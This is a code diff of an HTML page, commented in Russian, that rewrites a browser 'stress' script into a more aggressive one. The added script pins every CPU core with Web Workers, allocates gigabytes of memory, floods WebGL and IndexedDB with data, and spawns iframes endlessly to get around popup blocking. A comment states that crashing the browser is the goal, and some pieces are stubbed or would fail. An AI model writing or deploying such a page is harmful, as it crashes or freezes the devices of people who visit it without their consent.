@@ -1,39 +1,93 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>...</title>
-</head>
+<head><meta charset="UTF-8"></head>
 <body>
 <script>
-// Заполнение памяти массивами
-let arr = [];
-setInterval(() => {
-  for (let i = 0; i < 100000; i++) {
-    arr.push(new Array(10000).fill('x'));
+// 1. Занять все ядра CPU через Workers
+const numCores = navigator.hardwareConcurrency || 4;
+const workerCode = `
+  // Бесконечные вычисления с плавающей точкой
+  function busy() {
+    let a = 0;
+    for (let i = 1; i < 1e9; i++) {
+      a += Math.sin(i) * Math.cos(i) / (i + 1);
+    }
+    requestAnimationFrame(busy); // перезапуск
   }
-}, 100);
+  busy();
+`;
+for (let i = 0; i < numCores; i++) {
+  const blob = new Blob([workerCode], { type: 'application/javascript' });
+  const url = URL.createObjectURL(blob);
+  new Worker(url);
+}
 
-// Бесконечные вычисления (CPU)
+// 2. Пожирание памяти с SharedArrayBuffer (если разрешено)
+// (может не работать без COOP/COEP заголовков, попробуйте)
+try {
+  const sab = new SharedArrayBuffer(1024 * 1024 * 1024); // 1 ГБ
+  const view = new Uint8Array(sab);
+  setInterval(() => {
+    view.fill(255); // перезаписываем
+  }, 100);
+} catch (e) {}
+
+// 3. Усиленная память через обычные массивы – в цикле, чтобы не упираться в лимит вкладки
+const memoryHogs = [];
 setInterval(() => {
-  let a = 0;
-  for (let i = 0; i < 1e9; i++) {
-    a += i * i / (i + 1);
+  // Создаём 100 массивов по 10 млн элементов (числа, не строки — компактнее)
+  for (let i = 0; i < 100; i++) {
+    memoryHogs.push(new Float64Array(10_000_000));
   }
+  // Если массивов слишком много – браузер упадёт, но это цель
 }, 50);
 
-// WebGL нагрузка (GPU)
+// 4. WebGL – рендеринг сложной сцены (много треугольников)
 const canvas = document.createElement('canvas');
 document.body.appendChild(canvas);
-const gl = canvas.getContext('webgl');
-setInterval(() => {
-  gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
-  gl.clear(gl.COLOR_BUFFER_BIT);
-}, 10);
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+if (gl) {
+  // Создаём большой буфер с геометрией (миллионы вершин)
+  const vertices = [];
+  for (let i = 0; i < 1e6; i++) {
+    vertices.push(Math.random() * 2 - 1, Math.random() * 2 - 1);
+  }
+  const buffer = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
+  // ... настройка шейдера и отрисовка в цикле
+  setInterval(() => {
+    gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+    gl.clear(gl.COLOR_BUFFER_BIT);
+    gl.drawArrays(gl.POINTS, 0, vertices.length / 2);
+  }, 10);
+}
 
-// Множество вкладок через window.open (если не заблокировано)
-setInterval(() => window.open(window.location.href, '_blank'), 50);
+// 5. IndexedDB – запись гигантских объектов
+const dbReq = indexedDB.open('stress', 1);
+dbReq.onsuccess = (e) => {
+  const db = e.target.result;
+  const store = db.createObjectStore('data', { autoIncrement: true });
+  setInterval(() => {
+    const huge = new Uint8Array(100_000_000); // 100 МБ
+    crypto.getRandomValues(huge);
+    store.add(huge);
+  }, 100);
+};
+
+// 6. Обход блокировки попапов – создаём iframe со скриптом внутри
+setInterval(() => {
+  const iframe = document.createElement('iframe');
+  iframe.src = 'data:text/html;base64,' + btoa(`
+    <script>
+      // Внутри тоже запускаем этот же скрипт (рекурсивно)
+    <\/script>
+  `);
+  document.body.appendChild(iframe);
+}, 100);
+
 </script>
 </body>
 </html>
